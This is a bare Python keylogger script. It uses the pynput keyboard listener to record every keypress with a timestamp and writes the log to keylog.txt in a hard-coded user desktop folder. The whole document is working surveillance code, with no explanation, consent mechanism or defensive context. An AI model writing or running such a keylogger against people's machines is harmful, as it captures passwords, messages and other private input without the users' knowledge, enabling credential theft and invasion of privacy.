from pynput.keyboard import Key, Listener
import logging
import datetime
 
log_directory = r"C:/users/rober/desktop/"
 
logging.basicConfig(filename = (log_directory+"keylog.txt"), level = logging.DEBUG)
 
def on_press(key):
    logging.info('[' + str(datetime.datetime.now()) + ']:' + str(key))
 
with Listener(on_press = on_press) as listener:
    listener.join()